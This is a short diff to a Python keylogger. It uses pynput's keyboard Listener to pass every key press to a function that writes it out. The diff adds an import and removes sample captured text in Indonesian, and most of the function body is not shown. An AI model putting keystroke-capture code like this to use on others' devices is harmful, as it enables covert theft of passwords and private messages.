@@ -1,7 +1,6 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 
 def writetofile(key):
-
     letter = str(key)
     # ======== key replace ========
     letter = letter.replace("'","")
@@ -21,6 +20,3 @@ def writetofile(key):
 with Listener(on_press = writetofile) as l:
     l.join()
 
-halo semua
-aku lagi ngetik
-    tab
